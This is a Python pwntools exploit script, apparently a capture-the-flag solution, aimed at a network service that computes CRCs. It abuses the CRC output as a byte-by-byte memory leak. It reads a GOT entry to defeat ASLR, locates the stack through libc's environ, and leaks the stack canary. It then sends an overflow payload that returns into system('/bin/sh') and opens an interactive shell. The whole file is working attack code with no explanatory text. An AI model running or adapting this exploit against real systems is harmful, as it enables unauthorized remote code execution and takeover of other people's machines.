#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

host = "10.211.55.6"
port = 8888
#host = "69.90.132.40"
#port = 4002
r = remote(host,port)

# create a crc table to leak something
crcarray = [3523407757, 2768625435, 1007455905, 1259060791, 3580832660, 2724731650, 996231864, 1281784366, 3705235391, 2883475241, 3523407757, 1171273221, 3686048678, 2897449776, 901431946, 1119744540, 3484811241, 3098726271, 565944005, 1455205971, 3369614320, 3219065702, 651582172, 1372678730, 3245242331, 3060352845, 794826487, 1483155041, 3322131394, 2969862996, 671994606, 1594548856, 3916222277, 2657877971, 123907689, 1885708031, 3993045852, 2567322570, 1010288, 1997036262, 3887548279, 2427484129, 163128923, 2126386893, 3772416878, 2547889144, 248832578, 2043925204, 4108050209, 2212294583, 450215437, 1842515611, 4088798008, 2226203566, 498629140, 1790921346, 4194326291, 2366072709, 336475711, 1661535913, 4251816714, 2322244508, 325317158, 1684325040, 2766056989, 3554254475, 1255198513, 1037565863, 2746444292, 3568589458, 1304234792, 985283518, 2852464175, 3707901625, 1141589763, 856455061, 2909332022, 3664761504, 1130791706, 878818188, 3110715001, 3463352047, 1466425173, 543223747, 3187964512, 3372436214, 1342839628, 655174618, 3081909835, 3233089245, 1505515367, 784033777, 2967466578, 3352871620, 1590793086, 701932520, 2679148245, 3904355907, 1908338681, 112844655, 2564639436, 4024072794, 1993550816, 30677878, 2439710439, 3865851505, 2137352139, 140662621, 2517025534, 3775001192, 2013832146, 252678980, 2181537457, 4110462503, 1812594589, 453955339, 2238339752, 4067256894, 1801730948, 476252946, 2363233923, 4225443349, 1657960367, 366298937, 2343686810, 4239843852, 1707062198, 314082080, 1069182125, 1220369467, 3518238081, 2796764439, 953657524, 1339070498, 3604597144, 2715744526, 828499103, 1181144073, 3748627891, 2825434405, 906764422, 1091244048, 3624026538, 2936369468, 571309257, 1426738271, 3422756325, 3137613171, 627095760, 1382516806, 3413039612, 3161057642, 752284923, 1540473965, 3268974039, 3051332929, 733688034, 1555824756, 3316994510, 2998034776, 81022053, 1943239923, 3940166985, 2648514015, 62490748, 1958656234, 3988253008, 2595281350, 168805463, 2097738945, 3825313147, 2466682349, 224526414, 2053451992, 3815530850, 2490061300, 425942017, 1852075159, 4151131437, 2154433979, 504272920, 1762240654, 4026595636, 2265434530, 397988915, 1623188645, 4189500703, 2393998729, 282398762, 1741824188, 4275794182, 2312913296, 1231433021, 1046551979, 2808630289, 3496967303, 1309403428, 957143474, 2684717064, 3607279774, 1203610895, 817534361, 2847130659, 3736401077, 1087398166, 936857984, 2933784634, 3654889644, 1422998873, 601230799, 3135200373, 3453512931, 1404893504, 616286678, 3182598252, 3400902906, 1510651243, 755860989, 3020215367, 3271812305, 1567060338, 710951396, 3010007134, 3295551688, 1913130485, 84884835, 2617666777, 3942734927, 1969605100, 40040826, 2607524032, 3966539862, 2094237127, 198489425, 2464015595, 3856323709, 2076066270, 213479752, 2511347954, 3803648100, 1874795921, 414723335, 2175892669, 4139142187, 1758648712, 534112542, 2262612132, 4057696306, 1633981859, 375629109, 2406151311, 4167943193, 1711886778, 286155052, 2282172566, 4278190080]
cmap = dict(zip(crcarray,range(256)))

def getcrc(size,data):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(data)
    r.recvuntil(" CRC is: ")
    crc = r.recvuntil("\n")[:-1]
    return int(crc,16)

def leak(addr):
    payload = "\x00"*0x64
    payload += p32(addr)
    result = ""
    result += chr(cmap[getcrc(1,payload)])
    payload = "\x00"*0x64
    payload += p32(addr+1)
    result += chr(cmap[getcrc(1,payload)])
    payload = "\x00"*0x64
    payload += p32(addr+2)
    result += chr(cmap[getcrc(1,payload)])
    payload = "\x00"*0x64
    payload += p32(addr+3)
    result += chr(cmap[getcrc(1,payload)])
    return result


atoi_got = 0x08049ffc
atoi =  leak(atoi_got)
libc = u32(atoi) - 0x2d050
print hex(libc)
envrion = libc + 0x1dd8fc
stack = u32(leak(envrion))
print hex(stack)

canary_addr = stack - 0xd0
canary = u32(leak(canary_addr)) - 0xa
system = libc + 0x3a940
print hex(canary)
sh = libc + 0x158e8b
payload = "a"*0x28 + p32(canary) + p32(0)*3 + p32(system) + p32(0) + p32(sh)
r.recvuntil(":")
r.sendline(payload)
r.interactive()
